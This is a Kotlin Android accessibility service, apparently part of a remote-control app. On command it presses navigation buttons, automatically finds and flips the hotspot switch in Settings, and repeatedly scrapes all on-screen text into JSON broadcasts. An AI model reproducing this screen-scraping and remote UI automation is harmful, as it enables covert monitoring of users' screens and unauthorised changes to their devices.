package com.systemlinker.features

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Handler
import android.os.Looper
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import org.json.JSONArray
import org.json.JSONObject

class SystemAccessibility : AccessibilityService() {

    private var isStreamingScreen = false
    private var lastDumpTime = 0L
    private val DUMP_INTERVAL_MS = 500L

    private var isAutomatingHotspot = false

    private val commandReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            when (intent?.getStringExtra("action")) {
                "btn_back" -> performGlobalAction(GLOBAL_ACTION_BACK)
                "btn_home" -> performGlobalAction(GLOBAL_ACTION_HOME)
                "btn_recents" -> performGlobalAction(GLOBAL_ACTION_RECENTS)
                "stream_screen_start" -> isStreamingScreen = true
                "stream_screen_stop" -> isStreamingScreen = false
                "toggle_hotspot" -> {
                    isAutomatingHotspot = true
                    
                    // FAILSAFE: Force close settings after 3 seconds if it fails to find the switch
                    Handler(Looper.getMainLooper()).postDelayed({
                        if (isAutomatingHotspot) {
                            isAutomatingHotspot = false
                            performGlobalAction(GLOBAL_ACTION_BACK)
                        }
                    }, 3000)
                    
                    try {
                        val settingsIntent = Intent().apply {
                            setClassName("com.android.settings", "com.android.settings.TetherSettings")
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        }
                        this@SystemAccessibility.startActivity(settingsIntent)
                    } catch (e: Exception) {
                        val fallbackIntent = Intent("android.settings.TETHER_SETTINGS").apply {
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        }
                        this@SystemAccessibility.startActivity(fallbackIntent)
                    }
                }
            }
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
        }
        serviceInfo = info

        val filter = IntentFilter("com.systemlinker.ACC_ACTION")
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(commandReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(commandReceiver, filter)
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        // --- 1. HOTSPOT AUTOMATION LOGIC ---
        if (isAutomatingHotspot) {
            val rootNode = rootInActiveWindow ?: return
            
            val keywords = listOf("Wi-Fi hotspot", "Use Wi-Fi hotspot", "Portable hotspot", "Tethering", "Hotspot", "Mobile Hotspot")
            var clicked = false

            for (keyword in keywords) {
                if (findAndClickSwitchForText(rootNode, keyword)) {
                    clicked = true
                    break
                }
            }

            if (clicked) {
                isAutomatingHotspot = false
                Thread.sleep(300) // Let the UI register the toggle
                performGlobalAction(GLOBAL_ACTION_BACK)
            }
            
            rootNode.recycle()
            return 
        }

        // --- 2. SCREEN STREAMING LOGIC ---
        if (!isStreamingScreen) return
        
        val currentTime = System.currentTimeMillis()
        if (currentTime - lastDumpTime < DUMP_INTERVAL_MS) return
        lastDumpTime = currentTime

        val rootNode = rootInActiveWindow ?: return
        val screenData = dumpNode(rootNode)
        rootNode.recycle()

        val jsonPayload = JSONObject().apply {
            put("type", "live_screen")
            put("data", screenData)
        }
        
        val broadcast = Intent("com.systemlinker.SCREEN_DATA").apply {
            setPackage(applicationContext.packageName)
            putExtra("json", jsonPayload.toString())
        }
        sendBroadcast(broadcast)
    }

    /**
     * Master Search Function: Chains multiple strategies to guarantee a click.
     */
    private fun findAndClickSwitchForText(rootNode: AccessibilityNodeInfo, text: String): Boolean {
        
        // Strategy 1: Tree Climbing (Structural Search)
        val nodes = rootNode.findAccessibilityNodeInfosByText(text)
        if (!nodes.isNullOrEmpty()) {
            for (node in nodes) {
                var currentParent = node.parent
                var depth = 0
                while (currentParent != null && depth < 4) {
                    val switchNode = searchForSwitchInTree(currentParent)
                    if (switchNode != null && switchNode.isClickable) {
                        if (switchNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true
                    } else if (switchNode != null && currentParent.isClickable) {
                        if (currentParent.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true
                    }
                    currentParent = currentParent.parent
                    depth++
                }
                
                // Fallback 1: Just click whatever is clickable around the text
                val clickable = findClickableParent(node)
                if (clickable != null && clickable.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true
            }
        }

        // Strategy 2: Sequential Linear Lookahead (User's Algorithm)
        val state = SearchState()
        if (dfsSequentialSearch(rootNode, text, state)) {
            return true
        }

        return false
    }

    // State tracker for the sequential search
    private class SearchState(var recentMatch: Boolean = false, var steps: Int = 0)

    /**
     * Sequential DFS algorithm: 
     * Scans UI top-to-bottom. If it sees the keyword, it keeps its eyes open for the next 
     * 6 elements. If any of those are a Switch/Toggle, it clicks it immediately.
     */
    private fun dfsSequentialSearch(node: AccessibilityNodeInfo?, targetText: String, state: SearchState): Boolean {
        if (node == null) return false

        val nodeText = node.text?.toString() ?: ""
        
        // Did we hit the keyword?
        if (nodeText.contains(targetText, ignoreCase = true)) {
            state.recentMatch = true
            state.steps = 0
        } else if (state.recentMatch) {
            state.steps++
        }

        // If we recently saw the keyword, actively look for a switch in the next few elements
        if (state.recentMatch && state.steps <= 6) {
            val cName = node.className?.toString() ?: ""
            if (cName.contains("Switch") || node.isCheckable) {
                // Found a toggle right after the text! Click it.
                if (node.isClickable && node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true
                
                // Try clicking its direct parent if the switch itself isn't technically clickable
                val p = node.parent
                if (p != null && p.isClickable && p.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true
            }
        }

        // Continue scanning children sequentially
        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            val clicked = dfsSequentialSearch(child, targetText, state)
            child?.recycle() // Free memory
            if (clicked) return true
        }
        return false
    }

    private fun searchForSwitchInTree(node: AccessibilityNodeInfo?): AccessibilityNodeInfo? {
        if (node == null) return null
        val className = node.className?.toString() ?: ""
        
        if (className.contains("Switch") || node.isCheckable) return node
        
        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            val found = searchForSwitchInTree(child)
            if (found != null) return found
        }
        return null
    }

    private fun findClickableParent(node: AccessibilityNodeInfo?): AccessibilityNodeInfo? {
        var currentNode = node
        while (currentNode != null) {
            if (currentNode.isClickable) return currentNode
            val parent = currentNode.parent
            if (currentNode != node) currentNode.recycle()
            currentNode = parent
        }
        return null
    }

    private fun dumpNode(node: AccessibilityNodeInfo): JSONObject {
        val obj = JSONObject()
        obj.put("class", node.className?.toString() ?: "")
        obj.put("text", node.text?.toString() ?: "")
        obj.put("desc", node.contentDescription?.toString() ?: "")
        
        val children = JSONArray()
        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            if (child != null) {
                children.put(dumpNode(child))
                child.recycle()
            }
        }
        if (children.length() > 0) obj.put("children", children)
        return obj
    }

    override fun onInterrupt() {}

    override fun onDestroy() {
        super.onDestroy()
        unregisterReceiver(commandReceiver)
    }
}